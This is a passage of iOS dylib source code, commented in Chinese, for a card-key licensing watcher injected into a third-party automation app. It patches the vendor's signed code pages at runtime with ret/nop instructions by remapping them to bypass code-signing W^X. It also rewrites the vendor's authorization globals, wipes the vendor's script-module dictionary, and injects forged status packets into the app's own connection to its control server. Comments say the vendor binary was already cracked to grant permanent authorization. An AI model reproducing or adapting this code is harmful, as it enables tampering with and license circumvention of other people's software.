    // 首次 PENDING 不再逐拍打日志 —— bs_deveid_resolve() 已按 5 分钟限流报了
    // [deveid] PENDING，这里重复打会把 8KB 设备日志窗口刷满（v6.38 踩过的坑）。
}

/// 解析 /api/client/login 响应：只认 body 的 code（HTTP 状态码不可靠，文档 §9.1）。
/// 返回 code；expires_ts 经 out_exp 回写（解析不到=-1）。
static long bs_card_parse(const unsigned char *resp, size_t rn, long long *out_exp,
                          char *out_msg, size_t msgn) {
    *out_exp = -1;
    if (out_msg && msgn) out_msg[0] = 0;
    if (!resp || rn == 0) return -1;
    char *s = (char *)resp;
    s[rn] = 0;   // malloc(n+1) 保证有终止符位置

    long code = -1;
    // ★ v6.23e 修复：旧写法 strtol(p+6) 从冒号起 parse —— strtol(":2") 无有效数字
    //   **恒返回 0** ⇒ 任何业务失败（冻结2/过期3/绑定冲突5…）都被当成功！
    //   （实测 2026-10-03：冻结卡 4 拍心跳全部 login OK 的真根因。）
    //   改为先找 ':' 再取数字，与 expires_ts 的解析写法对齐。
    const char *p = strstr(s, "\"code\"");
    if (p) {
        const char *d = strchr(p + 6, ':');
        if (d) code = strtol(d + 1, NULL, 10);
    }

    p = strstr(s, "\"expires_ts\"");
    if (p) {
        const char *d = strchr(p + 12, ':');
        if (d) *out_exp = strtoll(d + 1, NULL, 10);
    }
    p = strstr(s, "\"message\"");
    if (p && out_msg) {
        const char *q = strchr(p + 9, '"');
        if (q) {
            q++;
            size_t i = 0;
            while (q[i] && q[i] != '"' && i + 1 < msgn) { out_msg[i] = q[i]; i++; }
            out_msg[i] = 0;
        }
    }
    return code;
}

/// 发 login：激活/续期/心跳三合一（幂等，重试不重复扣时长）。
/// ★ v6.22：把 CardVault 真实到期同步进厂商全局 g_agent_auth_valid_time（int32）。
/// 厂商 setter 已被 5 点补丁硬编码 0x7FFF0000（2038）→ 绕过 setter 直接写全局；
/// 反汇编实证全二进制唯一写点就是该 setter，本函数每 tick 重校准自愈。
static volatile int *g_vend_vt = NULL;
/// ★★★★ v6.42d：厂商授权态 g_agent_auth_state（int32，0=已授权 / 1=未授权）。
/// 中控「授权」列读的就是这个字段 —— 与「授权到期时间」列（g_agent_auth_valid_time）
/// 是**两个不同的全局**，此前我们只同步了后者，所以云端删卡后中控「到期」变空、
/// 「授权」却永远挂「已授权」（21:06 .216 实测）。
/// 本字段原本被 5 点补丁第 3 点（_set_agent_auth_state @+0xd8e4 改 mov x19,#0）
/// 恒置 0 —— 那是「unlock 包免卡密恒授权」的设计，与现在「无卡要如实显示未授权」
/// 冲突。改为由 cardwatch 每拍按真实卡状态写入，setter 补丁保留（不破坏厂商流程）。
static volatile int *g_vend_st = NULL;

/// ★ v6.23b：文本页补丁通道 —— mprotect 对签名 __TEXT 页被内核拒
///（errno=13，代码签名 W^X 强制），改用 mach_vm_remap OVERWRITE 整页替换
///（ellekit 同款）：临时页改好字 → 重映射覆盖 → icache 失效。
static int bs_patch_text_word(uintptr_t va, uint32_t word) {
    mach_port_t self = mach_task_self();
    // ★ v6.23d：iOS arm64 用户态页大小 = 16KB（不是 4KB！）。
    //   v6.23c 用 0x1000 对齐 → vm_remap 把非 16K 对齐 dst 向下圆整，
    //   覆盖整个 16K 页但 tmp 只装了错位 4K → 页内容错乱 SIGILL
    //   （.45 14:58 实锤：get_agent_activate_card+0 非法指令）。
    //   必须按 sysconf(_SC_PAGESIZE) 真实页大小对齐/复制/重映射。
    const vm_size_t PGSZ = (vm_size_t)sysconf(_SC_PAGESIZE);
    vm_address_t page_a = (vm_address_t)(va & ~((vm_address_t)PGSZ - 1));

    vm_address_t tmp = 0;
    kern_return_t kr = vm_allocate(self, &tmp, PGSZ, VM_FLAGS_ANYWHERE);
    if (kr != KERN_SUCCESS) {
        bs_log("[card] text patch: vm_allocate fail kr=%d", kr);
        return -1;
    }
    memcpy((void *)(uintptr_t)tmp, (const void *)page_a, (size_t)PGSZ);
    *(volatile uint32_t *)(uintptr_t)(tmp + (va - page_a)) = word;

    // ★ v6.23c：remap 目标页会继承源页保护——先把临时页转成 r-x（写已完成，
    //   收紧到 RX 是 W^X 允许的方向），否则 remap 后目标页 rw- 不可执行，
    //   厂商线程一进该页即 SIGBUS（.45 14:48 实锤：get_agent_activate_card
    //   Instruction Abort, 页 cur=rw-）。
    if (mprotect((void *)(uintptr_t)tmp, (size_t)PGSZ, PROT_READ | PROT_EXEC) != 0)
        bs_log("[card] text patch: tmp mprotect RX fail errno=%d", errno);

    vm_address_t dst = page_a;
    vm_prot_t cur = 0, mx = 0;
    kr = vm_remap(self, &dst, PGSZ, 0, VM_FLAGS_OVERWRITE,
                  self, tmp, FALSE, &cur, &mx, VM_INHERIT_COPY);
    vm_deallocate(self, tmp, PGSZ);
    if (kr != KERN_SUCCESS) {
        bs_log("[card] text patch: vm_remap fail kr=%d", kr);
        return -1;
    }
    // 双保险：目标页恢复 r-x（max=rwx 内收紧必然允许；若 tmp 转换失败这里兜底）
    if (mprotect((void *)(uintptr_t)page_a, (size_t)PGSZ, PROT_READ | PROT_EXEC) != 0)
        bs_log("[card] text patch: dst mprotect RX fail errno=%d (cur=%d mx=%d)",
               errno, cur, mx);
    sys_icache_invalidate((void *)va, 4);
    return 0;
}

/// ★ v6.23：中和厂商 set_agent_auth_valid_time（静态 vmaddr 0x10000d94c）。
/// 厂商状态机每 3~15s 调它一次 → 补丁版恒写 0x7FFF0000（2038）→ v6.22 的
/// 同步值被周期性覆盖、显示抖动。入口写 ARM64 `ret` 让调用变空操作后，
/// g_agent_auth_valid_time 只剩 cardwatch 一个写者，显示恒定。
/// 仅 unlock 模式调用（probe 真卡机绝不动厂商代码）。
static void bs_neutralize_vt_setter(uintptr_t base) {
    uintptr_t va = base + 0xd94c;                 // __TEXT vmaddr 0x100000000 起
    static const uint32_t ARM64_RET = 0xd65f03c0u;
    if (bs_patch_text_word(va, ARM64_RET) == 0)
        bs_log("[card] vt setter neutralized (ret @ +0xd94c) -> display ours");
}

/// ★★★★ v6.42e：中和厂商对 g_agent_auth_state 的写入点
///（`0x10000d8fc: str w19, [x8, #0xb4c]`，vmaddr 0x100000000 起）。
///
/// 为什么必须做：v6.42d 实测 22:08:27 云端删卡后我们写 1，但厂商每 48s 又写回 0 ——
/// 日志出现四次 `auth_state 0 -> 1`（1793282907 / 2913 / 2961 / 3009），
/// 也就是中控「授权」列每 48s 闪一次「已授权」。根因是 5 点补丁第 3 点只把
/// setter 内部的 `mov x19,x0` 改成 `mov x19,#0`，**调用点照旧周期性执行**，
/// 每次调用都把 state 刷成 0（已授权）。
///
/// 修法与 vt setter 略不同：这里只把那条 `str` 换成 `nop`，**不**在函数入口打
/// `ret` —— 因为该 setter 前面还有一次 `bl 0x10003e938`、尾部还有 `b 0x10003e944`，
/// 整入口打 ret 会把这些厂商逻辑一并跳掉。nop 掉写入后，
/// g_agent_auth_state 与 g_agent_auth_valid_time 一样只剩 cardwatch 一个写者。
///
/// 同页说明：0xd8fc 与 vt setter 的 0xd94c 同在 16KB 页内，
/// bs_patch_text_word 每次都 memcpy 当前页内容，两次 patch 会累积生效。
/// 仅 unlock 模式调用（probe 真卡机绝不动厂商代码）。
static void bs_neutralize_st_setter(uintptr_t base) {
    uintptr_t va = base + 0xd8fc;                 // str w19, [x8, #0xb4c]
    static const uint32_t ARM64_NOP = 0xd503201fu;
    if (bs_patch_text_word(va, ARM64_NOP) == 0)
        bs_log("[card] st setter write nop (0xd8fc) -> display ours");
}

static void bs_sync_vendor_expire(void) {
    if (!g_vend_vt) {
        int *p = (int *)dlsym(RTLD_DEFAULT, "g_agent_auth_valid_time");
        if (!p) return;
        g_vend_vt = (volatile int *)p;
        bs_log("[card] vendor valid_time found, now=%d", (int)*g_vend_vt);
    }
    // expire>0 → 写真实到期；expire<=0（未激活 / 卡被删 / 被接管）→ 写 0（显示为空）
    //
    // ★★★★ v6.42f 语义变更：卡**已过期**时 g_card_expire 不再清 0（见心跳 rc==3 分支），
    //   所以这里会把「已经过去的时间戳」原样写出去 → 中控到期列显示过期那天，
    //   而 verdict_ok=0 让「授权」列同时挂「未授权」。
    //   即中控呈现为 `未授权 | 2026/10/25 10:19`，与厂商原生行为（.98 实测）一致。
    int want = (g_card_expire > 0) ? (int)g_card_expire : 0;
    if (*g_vend_vt != want) {
        int oldv = (int)*g_vend_vt;
        *g_vend_vt = want;
        bs_log("[card] valid_time %d -> %d (CardVault expire sync)", oldv, want);
    }
}

/// ★★★★ v6.42d：把真实授权态同步进厂商全局 g_agent_auth_state（中控「授权」列）。
///
/// 为什么必须做：中控两列来自**两个不同全局**——
///   · 「授权」      ← g_agent_auth_state（off 0x4fb4c；0=已授权 / 1=未授权）
///   · 「授权到期时间」← g_agent_auth_valid_time（off 0x530c0）
/// 我们以前只写后者 ⇒ 云端删卡/拉黑后到期列变空、授权列却恒「已授权」，
/// 运营看到的是一台「已授权但没到期时间」的机器，正好是用户诉求的反面。
///
/// 写入值严格对齐 cardwatch 自己的闸门判定（verdict_ok），保证
/// **中控显示 = 设备实际行为**，不会出现「中控说未授权、脚本还在跑」的偏差。
///
/// 语义风险：该字段厂商状态机也读，写 1 可能触发厂商自身的授权失败分支。
/// 实测若出现自停，退路是只改上报不改全局（hook 上报序列化），见 v6.42e 备注。
static void bs_sync_vendor_auth_state(int ok) {
    if (!g_vend_st) {
        int *p = (int *)dlsym(RTLD_DEFAULT, "g_agent_auth_state");
        if (!p) {
            static int once = 0;
            if (!once) {
                once = 1;
                bs_log("[card] vendor auth_state symbol NOT found -> auth-column sync off");
            }
            return;
        }
        g_vend_st = (volatile int *)p;
        bs_log("[card] vendor auth_state found, now=%d (0=auth 1=unauth)", (int)*g_vend_st);
    }
    int want = ok ? 0 : 1;
    if (*g_vend_st != want) {
        int oldv = (int)*g_vend_st;
        *g_vend_st = want;
        bs_log("[card] auth_state %d -> %d (verdict=%s -> center auth column)",
               oldv, want, ok ? "valid" : "invalid");
    }
}

/// ★ v6.23i：清空厂商 onion 字典（封禁期每拍调用）。
/// 字典 = static vmaddr OFF_ONION_DICT 处的 NSMutableDictionary*（name -> NSData 模块代码）。
/// 不清的后果：中控一点运行，厂商脚本引擎直接用封禁前注入的旧模块跑
/// （.45 2026-10-03 删卡实测）。厂商在 _bb_init_script_player 里会整体换新
/// 字典对象 —— 换了自然空；没换我们清。类型不符（不可变字典等）不动，防异常。
/// ★ 有意保留「有内容才打日志」：若厂商/中控在封禁期重灌字典，这里会连续
///   打出条数 —— 那就是「存在绕过我们的脚本下发通道」的实证信号。
static void bs_wipe_onion_dict(uintptr_t base) {
    if (!base) return;
    @autoreleasepool {
        void *dp = *(void **)(base + OFF_ONION_DICT);
        if (!dp) return;
        NSMutableDictionary *dict = (__bridge NSMutableDictionary *)dp;
        if (![dict isKindOfClass:[NSMutableDictionary class]]) return;
        NSUInteger n = [dict count];
        if (n > 0) {
            [dict removeAllObjects];
            bs_log("[card] onion dict wiped (%lu module(s) cleared)", (unsigned long)n);
        }
    }
}

/// 返回 0=ok（g_card_expire 已更新）；-1=网络失败；业务码原值返回。
static long bs_card_login(const char *card, int act_new) {
    // ★★★★ v6.41：设备号未就位时**绝不上报**。旧版会发 `"device_id":""`，
    //   服务端按空 device 记账；等真值到位后整台机在库里看起来像换了设备
    //   （2026-10-27 那台 15f9da… 的冲突就是这么记进去的）。
    //   返回 -1（网络类）：调用方对 rc<0 不做任何封禁/清卡，等下一拍重试。
    if (!g_card_devid[0]) {
        bs_log("[card] login skipped: device_id pending (agent dev_id not ready)");
        return -1;
    }
    char url[256];
    snprintf(url, sizeof(url), "http://%s%s", g_card_host, CARD_PATH);

    // ★ v6.23s：act=new 仅激活（卡变更）携带 —— 服务端 bsmod v3.10 据此区分
    //   「真换卡接管」与「心跳」，心跳绝不带 act（防两台互抢振荡）
    char body[280];
    unsigned long long nonce = (unsigned long long)time(NULL) << 17
                             ^ (unsigned long long)(uintptr_t)&nonce;
    if (act_new)
        snprintf(body, sizeof(body),
                 "{\"card\":\"%s\",\"device_id\":\"%s\",\"nonce\":\"%016llx\","
                 "\"act\":\"new\"}",
                 card, g_card_devid, nonce & 0xFFFFFFFFFFFFFFFFULL);
    else
        snprintf(body, sizeof(body),
                 "{\"card\":\"%s\",\"device_id\":\"%s\",\"nonce\":\"%016llx\"}",
                 card, g_card_devid, nonce & 0xFFFFFFFFFFFFFFFFULL);

    size_t rn = 0;
    long code = 0;
    unsigned char *rb = bs_http_post_key(url, "application/json", g_card_key,
                                         body, strlen(body), &rn, &code);
    if (!rb) {
        bs_log("[card] network fail (no response)");
        return -1;
    }
    long long exp = -1;
    char msg[64] = {0};
    long rc = bs_card_parse(rb, rn, &exp, msg, sizeof(msg));
    free(rb);

    if (rc == 0) {
        if (exp > 0) g_card_expire = (long)exp;
        // ★★★★ v6.42g：服务端返回 code=0 但 expires_ts 已在过去时，**不能**把
        //   lastok 记成 now。否则闸门的宽限判定
        //     `now < lastok + cardgrace*3600` → verdict_ok=1
        //   会把「已过期」的卡判成「已授权」整整 1 小时 ——
        //   中控上表现为 `已授权 | 2026/10/26 15:33`（一个已经过去的时间），
        //   比原先的空白更难解释。2026-10-29 桩测实测到这一拍
        //   （`re-authorized (expire=1793000000) -> gates open` 紧跟在
        //     `login OK expire=1793000000` 后面）。
        //   真实触发场景：服务端与设备时钟有偏差、或卡恰好在两次心跳之间到期、
        //   或运维手工把 expires_at 调早。宽限的本意只是「网络抖动别误停」，
        //   不该给一张已经到期的卡续命。
        long nowsec = (long)time(NULL);
        if (exp > 0) {
            g_card_lastok = ((long)exp > nowsec) ? nowsec : 0;
        } else {
            g_card_lastok = nowsec;       // 没带 expires_ts（续期类应答）按正常处理
        }
        bs_log("[card] login OK expire=%ld lastok=%ld (%.20s...)",
               g_card_expire, g_card_lastok, card);
        bs_sync_vendor_expire();          // ★ v6.22：激活即同步中控显示
    } else {
        bs_log("[card] login FAIL code=%ld msg=%s (http=%ld)", rc, msg, code);
    }
    return rc;
}

/// 卡密状态机主循环。3s 一拍：读卡密 → 变更即激活 → cardtick 到点心跳 → 维护封禁态。
/* ================= ★★★★★ v6.46：向 BBCenter 中控写设备「备注」 =================
 * 需求：卡密冲突 / 卡状态不再只能翻 BSModuleServer.exe 的运行日志，
 *       直接显示在 BBCenter.exe 设备列表的「备注」列上（运维一眼就看到）。
 *
 * 实测协议（2026-10-30，.98 真机 + Frida hook ws2_32.recv）：
 *   [0:4]   包总长（含自身，小端）
 *   [4:6]   命令   07 00 = 状态上报（01 00 = 9 字节心跳）
 *   [6]     版本   01
 *   [7]     状态位 0=正常 / 1=异常
 *   [8:12]  授权到期 unix 秒
 *   [12]    01   [13] 02   [14:16] 00 00   [16:20] 设备指纹   [20] 01
 *   [21:]   备注 UTF-8，无长度前缀、无结束符
 *
 * BBCenter 侧证据：RVA 0xb2a4  cmp rax,0x15 → <=21 清空备注，>21 取 [0x15:]
 *                  转 QString 写 dev+0x118；填表 RVA 0x29ad0 写 dev+0xE0（备注列）。
 *
 * 四条硬实测结论：
 *   ① 中控按**源 IP** 归属设备；[16:20] 那 4 字节「设备指纹」每次都是随机 nonce，不校验。
 *   ② ★★★★★ **必须复用 App 自己那条持久连接**。新开的 TCP 连接即使源 IP 正确、
 *      包格式完全正确，中控 recv 收到后也会丢弃（实测：0xb2a4 解析点零命中、备注列不动）。
 *      只有 App 自己的那条连接（连上后先发 9B 心跳、由中控建立设备上下文）才被认。
 *      v6.45 独立建连失败的真因就在这里，不是格式问题。
 *   ③ 一条连接**不要连发两个包** —— 原厂时序是「心跳 9B → 状态 21B」，我们只插状态包。
 *   ④ 备注是「当前值」不是流水，原厂状态变化时会覆盖 → cardwatch 定期重刷。
 *
 * ★ v6.47/v6.48/v6.49 补充（用户拍板，2026-10-30）：
 *   ⑤ 卡密冲突**只报一次**。备注定格显示的是「当前值」，同一条冲突每 45s 重推毫无
 *      意义；更要命的是会一直挂在中控上误导判断。→ g_note_conflict_sent 记忆已报，
 *      只有撞的卡号换了（新一轮冲突）才允许再报一次。
 *   ⑥ 冲突**解除后必须主动覆盖**。A 机撞冲突 → 运营改输一张没人绑定的卡（激活成功）
 *      → 中控备注不会自己恢复，必须 g_note_force=1 走 15s 快通道推一次当前真实状态。
 *      同理：真输入解除拉黑、探活恢复、重输本机原卡、心跳发现被接管，都要 force。
 */
static int bs_center_find_sock(const char *ip, int port) {
    if (!ip || !ip[0] || port <= 0) return -1;
    struct sockaddr_in want;
    memset(&want, 0, sizeof(want));
    want.sin_family = AF_INET;
    want.sin_port   = htons((uint16_t)port);
    want.sin_addr.s_addr = inet_addr(ip);
    if (want.sin_addr.s_addr == INADDR_NONE) return -1;
    /* 在本进程（App）里找那条已连上中控的 socket —— getpeername 逐个探，3..1024 足够 */
    for (int f = 3; f < 1024; f++) {
        struct sockaddr_in sa;
        socklen_t sl = sizeof(sa);
        memset(&sa, 0, sizeof(sa));
        if (getpeername(f, (struct sockaddr *)&sa, &sl) != 0) continue;
        if (sa.sin_family != AF_INET) continue;
        if (sa.sin_port != want.sin_port) continue;
        if (sa.sin_addr.s_addr != want.sin_addr.s_addr) continue;
        return f;
    }
    return -1;
}

/// ★★★★★ v6.50：状态包 [7] 位必须跟随 App 真实的「脚本运行中」标志。
///
/// 事故（2026-10-30 04:14，.216）：中控下发「运行」后脚本确实在跑（run=1、
/// sjz.log 每秒在写），但 BBCenter 设备列表「运行」列一直显示「空闲」。
/// 反汇编 BBCenter 定位到解析函数（RVA 0xb184 起）：
///     movzx ecx, byte ptr [rax + 6]  →  mov [rdi + 0xf0], ecx
///     movzx ecx, byte ptr [rax + 7]  →  mov [rdi + 0xb8], ecx   ← ★ 就是这一位
///     mov     eax, dword ptr [rax+8] →  到期（0 则清空 [rdi+0xc0]）
///     cmp rax,0x15 → 备注 → [rdi+0x118]
/// 填表函数（RVA 0x29ad0）再把 dev+0xb8 原样搬到表格列 +0x80。
/// 而 v6.45~v6.49 这里写的是死值 **0x00**（当时注释还写着「只借备注，不干扰原厂判定」——
/// 想当然）。中控把 0 当「空闲」，于是每推一次备注就把运行列刷成一次空闲；
/// 而原厂状态包只在状态变化时发，不会来纠正 ⇒ 运行列永久卡在「空闲」。
///
/// 现在跟真实值走：脚本在跑 → 1，没跑 → 0。这样备注包带的就是中控该显示的态。
static int bs_center_run_flag(void) {
    if (!g_base) return 0;
    volatile uint8_t *runp = (volatile uint8_t *)(g_base + OFF_RUN);
    return (*runp) ? 1 : 0;
}

static int bs_center_note_send(const char *ip, const char *note) {
    if (!ip || !ip[0]) return -1;
    size_t nl = note ? strlen(note) : 0;
    if (nl > 240) nl = 240;
    unsigned char pkt[21 + 240];
    size_t total = 21 + nl;

    memset(pkt, 0, 21);
    uint32_t t = (uint32_t)total;
    memcpy(pkt, &t, 4);                       // [0:4] 总长 —— ★ 改备注必须同步改这里
    pkt[4] = 0x07; pkt[5] = 0x00;             // [4:6] 命令：状态上报
    pkt[6] = 0x01;                            // [6]   版本
    pkt[7] = (unsigned char)bs_center_run_flag(); // ★ v6.50：真实运行态（1=运行 0=空闲）
    uint32_t exp = (uint32_t)(g_card_expire > 0 ? g_card_expire : 0);
    memcpy(pkt + 8, &exp, 4);                 // [8:12] 授权到期
    pkt[12] = 0x01; pkt[13] = 0x02;           // [12][13] 固定
    pkt[20] = 0x01;                           // [20]   固定
    if (nl) memcpy(pkt + 21, note, nl);       // [21:]  备注

    /* ★★★★★ 优先复用 App 自己到中控的持久连接（唯一被中控认可的那条） */
    int efd = bs_center_find_sock(ip, g_noteport);
    if (efd >= 0) {
        int one = 1;
        setsockopt(efd, SOL_SOCKET, SO_NOSIGPIPE, &one, sizeof(one));
        struct timeval stv;
        stv.tv_sec = 2; stv.tv_usec = 0;
        setsockopt(efd, SOL_SOCKET, SO_SNDTIMEO, &stv, sizeof(stv));
        ssize_t ew = send(efd, pkt, total, 0);
        if (ew == (ssize_t)total) {
            static int s_lastfd = -1;
            if (efd != s_lastfd) {
                s_lastfd = efd;
                bs_log("[note] reused app socket fd=%d", efd);
            }
            return 0;
        }
    }

    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0) return -2;

    /* ★★★★★ 必须有：中控提前 close 时 send 会抛 SIGPIPE，直接把承载 dylib 的 App 杀掉 */
    int one = 1;
    setsockopt(fd, SOL_SOCKET, SO_NOSIGPIPE, &one, sizeof(one));

    /* ★ 非阻塞 connect + select 2 秒超时：中控没开也绝不能卡住 cardwatch 主循环
       （connect 不受 SO_SNDTIMEO 约束，阻塞模式下会挂几十秒） */
    int fl = fcntl(fd, F_GETFL, 0);
    fcntl(fd, F_SETFL, fl | O_NONBLOCK);

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port   = htons((uint16_t)g_noteport);
    sa.sin_addr.s_addr = inet_addr(ip);
    if (sa.sin_addr.s_addr == INADDR_NONE) { close(fd); return -3; }

    if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) != 0) {
        if (errno != EINPROGRESS) { close(fd); return -3; }
        fd_set wf; FD_ZERO(&wf); FD_SET(fd, &wf);
        struct timeval ctv; ctv.tv_sec = 2; ctv.tv_usec = 0;
        if (select(fd + 1, NULL, &wf, NULL, &ctv) <= 0) { close(fd); return -3; }
        int soerr = 0; socklen_t sl = sizeof(soerr);
        if (getsockopt(fd, SOL_SOCKET, SO_ERROR, &soerr, &sl) != 0 || soerr != 0) {
            close(fd); return -3;
        }
    }

    fcntl(fd, F_SETFL, fl);                    // 恢复阻塞，配合 SO_SNDTIMEO
    struct timeval tv;
    tv.tv_sec = 2; tv.tv_usec = 0;
    setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));

    ssize_t w = send(fd, pkt, total, 0);
    close(fd);
    return (w == (ssize_t)total) ? 0 : -4;
}

/// ★★★★★ v6.49：备注主状态必须与「授权」列**同一判据**。
///
/// 用户 2026-10-30 03:30 报障（.98）：输了一张别人已绑的卡之后，中控那一行变成
///     授权=已授权 ｜ 备注=本机卡密已被其他设备接管
/// 两个字段自相矛盾，运营没法判断这台机器到底能不能跑。
///
/// 根因是两条链路各用各的判据：
///   · 「授权」列 ← bs_sync_vendor_auth_state(verdict_ok)，verdict_ok 含 grace 宽限；
///   · 「备注」    ← 旧实现只看 g_card_cur / g_card_expire，不看宽限，也不保证
///                  备注变更一定送达到中控（发送失败就永久残留旧文案）。
/// 只要两边错位一次，中控上就会长期挂着一条与授权列打架的备注。
///
/// 现在：valid 与 verdict_ok 完全同源 —— valid=1 时备注只可能是「正常 …」，
/// 「接管 / 冲突」这类负面文案**只允许出现在 valid=0 时**。
static int bs_note_verdict_ok(long now) {
    if (g_card_cur[0] && g_card_expire > 0 && now < g_card_expire) return 1;
    if (g_card_expire > 0 && g_card_lastok > 0 &&
        now < g_card_lastok + (long)g_cardgrace * 3600) return 1;
    return 0;
}

/// 组装当前状态文案并推给中控
/// ★ v6.49 三条规则（用户 2026-10-30 拍板）：
///   ① **文案与授权列同源** —— 永不出现「已授权 + 本机卡密已被其他设备接管」；
///   ② **状态一变立刻覆盖** —— 卡恢复 / 冲突解除后 3 秒内就把旧文案换掉，
///      不再等 45s 轮询位（.98 实测：旧版恢复后中控上还挂着「已被接管」十几分钟）；
///   ③ **同文案不发**，只每 300s 幂等保底重推一次（防原厂状态包把备注冲成空），
///      日志只在文案变化时打一条 —— 这就是用户要的「卡密冲突只上报一次」：
///      中控上那条文案是稳定的，不会每 45s 刷新一遍。
/// ★ v6.50 追加（用户 2026-10-30 04:20）：
///   ④ **不得干扰原厂「运行」列**：包 [7] 从死值 0 改为真实运行态（见 bs_center_run_flag）；
///   ⑤ **不得反复覆盖原厂自己的备注**：正常态去掉 300s 保底重推，只在文案变化 /
///      运行态翻转 / force 时推；异常态才保底重推。
static void bs_center_note_tick(void) {
    char ip[64] = "";
    bs_pc_ip_of_plist(ip, sizeof(ip));
    if (!ip[0]) snprintf(ip, sizeof(ip), "%s", g_appip);
    if (!ip[0]) return;                       // 没配中控地址，什么都不做

    long now = (long)time(NULL);
    char exp[24] = "";
    if (g_card_expire > 0) {
        time_t t = (time_t)g_card_expire;
        struct tm tmv;
        if (localtime_r(&t, &tmv) != NULL)
            snprintf(exp, sizeof(exp), "%02d-%02d", tmv.tm_mon + 1, tmv.tm_mday);
    }

    int valid    = bs_note_verdict_ok(now);
    int conflict = g_note_cf_card[0] && (now - g_note_cf_ts) < 1800;
    if (valid && conflict) {
        /* ★ v6.49：本机卡有效、但又撞了别人已绑的卡。以前这种组合会被写成
           「本机卡密已被其他设备接管」，跟授权列的「已授权」直接打架。
           现在只在「正常 …」尾部加 (他卡被拒)，并留一条英文日志便于现场核对。 */
        static int vc_logged = 0;
        if (!vc_logged) {
            vc_logged = 1;
            bs_log("[note] conflict tag applied on valid card (own card unaffected)");
        }
    }

    char note[256] = "";
    if (valid) {
        /* 有效卡：主状态永远是「正常」。刚误输别人的卡时只在尾部补个短标记，
           既保留告警信息，又绝不会跟「已授权」打架。 */
        if (conflict)
            snprintf(note, sizeof(note), "正常 %s 到期%s (他卡被拒)",
                     BS_DYLIB_VER, exp[0] ? exp : "?");
        else
            snprintf(note, sizeof(note), "正常 %s 到期%s",
                     BS_DYLIB_VER, exp[0] ? exp : "?");
    } else if (conflict && g_card_cur[0]) {
        snprintf(note, sizeof(note),
                 "卡密冲突:%.16s 已被其他设备占用,已拒绝(本机不受影响)", g_note_cf_card);
    } else if (conflict) {
        snprintf(note, sizeof(note), "本机卡密已被其他设备接管");
    } else if (g_card_expire > 0 && g_card_expire < now) {
        snprintf(note, sizeof(note), "卡已过期 %s", exp[0] ? exp : "?");
    } else {
        snprintf(note, sizeof(note), "未授权 %s", BS_DYLIB_VER);
    }

    int runnow  = bs_center_run_flag();
    int runchg  = (g_note_lastrun != runnow);     // ★ v6.50：运行态翻转必须补推
    int changed = strcmp(note, g_note_last) != 0;
    int forced  = g_note_force;
    if (!changed && !forced && !runchg && (now - g_note_ts) < 300) {
        /* ★★★★★ v6.51（2026-10-30 04:40 .216 实测修正）：
         *   v6.50 一度试过「正常态永不周期重推」，实测**不能这么做** ——
         *   原厂每发一个 ≤21 字节的 07 包就会把备注清空（BBCenter 0xb2a4
         *   `cmp rax,0x15; jbe clear_remark`）。装 v6.50 后 .216 备注列
         *   只剩 40 秒就被原厂清空，之后再也不回来（截图 04:36 实证：备注空）。
         *   所以 **正常态也必须保留 300s 保底重推**，否则「备注显示卡密绑定状态」
         *   这个原始需求就废了。
         *   而「覆盖原厂自己写的备注」这个担心，在 v6.50 修好 [7] 之后已经不再
         *   有额外代价：原厂自己也会用下一个包把备注清掉/改写，这个字段本来就是
         *   「当前值」不是流水。我们能保证的是**不再因为重推而搅乱运行列**。 */
        return;
    }
    int rc = bs_center_note_send(ip, note);
    if (rc == 0) {
        snprintf(g_note_last, sizeof(g_note_last), "%s", note);
        g_note_ts    = now;
        g_note_force = 0;
        g_note_lastrun = runnow;
        if (changed || forced || runchg)
            bs_log("[note] -> %s:%d  %s (run=%d)", ip, g_noteport, note, runnow);
    } else if ((now - g_note_ts) > 30) {
        /* 发送失败也必须重试：旧版只在 120s 后重试一次就放弃，
           .98 那次「卡恢复了、备注还挂着接管」就是这里丢的。 */
        g_note_ts = now;
        bs_log("[note] -> %s:%d failed rc=%d（中控未开或端口不对）", ip, g_noteport, rc);
    }
}

static void *bs_cardwatch(void *arg) {
    uintptr_t base = (uintptr_t)arg;
    bs_card_device_id();
    bs_card_cache_load();
    bs_neutralize_vt_setter(base);                // ★ v6.23：厂商 setter 变空操作
    bs_neutralize_st_setter(base);                // ★ v6.42e：厂商 state 写入点 nop（同页累积）

    // 解析 Agent 的卡密 getter（厂商符号表暴露，get_* 系列优先）
    typedef char *(*get_str_fn)(void);
    get_str_fn fn_get_card = (get_str_fn)dlsym(RTLD_DEFAULT, "get_agent_activate_card");
    void *gbuf = dlsym(RTLD_DEFAULT, "g_agent_activate_card");
    bs_log("[card] watch start devid=%s tick=%ds grace=%dh getter=%s buf=%s",
           g_card_devid, g_cardtick, g_cardgrace,
           fn_get_card ? "fn" : "none", gbuf ? "yes" : "no");
    if (!fn_get_card && !gbuf) {
        bs_log("[card] no symbol access -> cardcheck disabled this session");
        return NULL;
    }

    int prev_blocked = -1;   // 首轮强制评估
    long last_check  = 0;
    long pend_since  = 0;    // ★ v6.42：设备码 PENDING 起始时刻（判决用）
    // ★ v6.49：中控备注改为「每拍评估 + 函数内节流」，不再需要外部计数

    for (;;) {
        sleep(3);
        // ★ v6.45：把卡状态 / 卡密冲突写进 BBCenter 设备列表的「备注」列
        // ★ v6.47：状态切换（冲突解除/激活成功）走 15s 快通道，常规仍 45s 刷一次
        // ★ v6.49：每拍都评估。函数内部自己节流（文案没变就不同发，变了立刻推），
        //   这样「冲突解除 / 卡恢复」最多 3 秒就把中控上的旧文案覆盖掉。
        bs_center_note_tick();
        // ★★★★ v6.41：每拍复核设备码 —— 启动时 Agent 可能还没收到服务端设备码，
        //   真源一就位立即生效（失败时保持上一次值，不会退回空/不会换号）。
        bs_card_device_id();
        long now = (long)time(NULL);

        // ---- v6.21 ①：agent.log 捕获中控输入的卡密（主通道，尾部扫描自愈版） ----
        // 厂商流程：中控输卡 → Agent 打 "begin process activate card!" + 卡号行
        //（厂商验卡失败不写内存全局 → getter 读空）。每 tick 扫 agent.log 末尾
        // 64KB，取**最后一次**激活事件的卡号 —— 无 offset 状态，丢不了增量。
        static char   lg_card[80] = {0};
        static long   lg_ts       = 0;    // ★ v6.23t 该次激活事件的时间戳（行首 [Y/M/D H:M:S]）
        static int    lg_seen = 0;        // 首次成功扫到文件时打一次性诊断
        struct stat lst;
